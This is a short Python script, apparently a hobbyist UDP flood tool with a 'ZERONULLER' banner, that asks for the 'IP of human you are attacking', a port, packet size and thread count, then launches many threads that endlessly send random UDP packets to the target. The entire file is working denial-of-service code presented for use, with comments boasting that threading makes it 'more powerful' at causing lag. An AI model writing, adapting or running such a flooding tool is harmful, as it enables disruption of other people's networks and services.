import threading
import socket
import random
import sys
import ctypes
import os
def start(ip, port, size, index):
    xxv = 0
    data = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)         
    while True:
        data.sendto(random._urandom(size), (ip, port)) # Welp it just sends sockets ig
        xxv = xxv+1
        print(f"TOTAL CONNECTIONS => {xxv} | BYTES => {size} | TARGET => {ip}:{port}")
        
        
        
def main():
    try:
        if len(sys.argv) < 5:
           print('''
           ███████╗███████╗██████╗░░█████╗░███╗░░██╗██╗░░░██╗██╗░░░░░██╗░░░░░███████╗██████╗░
           ╚════██║██╔════╝██╔══██╗██╔══██╗████╗░██║██║░░░██║██║░░░░░██║░░░░░██╔════╝██╔══██╗
           ░░███╔═╝█████╗░░██████╔╝██║░░██║██╔██╗██║██║░░░██║██║░░░░░██║░░░░░█████╗░░██████╔╝
           ██╔══╝░░██╔══╝░░██╔══██╗██║░░██║██║╚████║██║░░░██║██║░░░░░██║░░░░░██╔══╝░░██╔══██╗
           ███████╗███████╗██║░░██║╚█████╔╝██║░╚███║╚██████╔╝███████╗███████╗███████╗██║░░██║
           ╚══════╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝░╚═════╝░╚══════╝╚══════╝╚══════╝╚═╝░░╚═╝
           Version 0.0.2''')
        target= input("IP of human you are attacking? \n") if len(sys.argv) < 2 else sys.argv[1]
        port= int(input("Port? (80) \n")) if len(sys.argv) < 3 else int(sys.argv[2])
        packet= int(input("Packet size? (1000) \n")) if len(sys.argv) < 4 else int(sys.argv[3])
        threads= int(input("Threads? (1000) \n")) if len(sys.argv) < 5 else int(sys.argv[4])

        if port > 65535 or port < 1:
            print("\n<<ERROR>> Port should be between 1, 65535") # min port is 1 and max port is 65535 so here we prevent people from typing something like 8000000000
            sys.exit(1)

        if packet > 65500 or packet < 1:
            print("\n<<ERROR>> Size should be between 1 and 65500") # similar to port
            sys.exit(1)

    except KeyboardInterrupt:
        print("\nSee you soon :)") # if anyone will click ctrl + c or ctrl + z it will print this message
        sys.exit()
    
    except Exception as e:
        print(f"\n<<ERROR>> {e}") # well this is kinda useless but if error came out this will print it
        sys.exit()

    for i in range(threads):
        try:
            t = threading.Thread(target=start, args=(target, port, packet, i)) # i used threading so it can become more powerful and lag easily
            t.start()
        except Exception as e:
            print(f"\n<<ERROR>> An error ocurred initializing thread {i}: {e}")  # self explanatory      

if __name__ == "__main__":
    main()
